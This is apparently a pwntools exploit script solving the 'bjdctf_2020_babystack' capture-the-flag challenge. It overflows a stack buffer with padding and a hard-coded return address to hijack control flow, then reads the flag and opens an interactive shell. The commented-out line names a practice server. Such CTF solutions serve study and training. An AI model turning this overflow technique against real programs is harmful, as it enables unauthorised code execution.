from pwn import *

io = process('./bjdctf_2020_babystack')
#io = remote('node4.buuoj.cn',26696)
#context.log_level = 'debug'
#raw_input()

payload = b'a'*0x10 + b'b'*0x8

payload += p64(0x4006e6)
io.recvuntil(b'name:')
io.sendline(b'30')
io.recvuntil(b'name?')
io.send(payload)
io.sendline(b'cat /flag')

io.interactive()
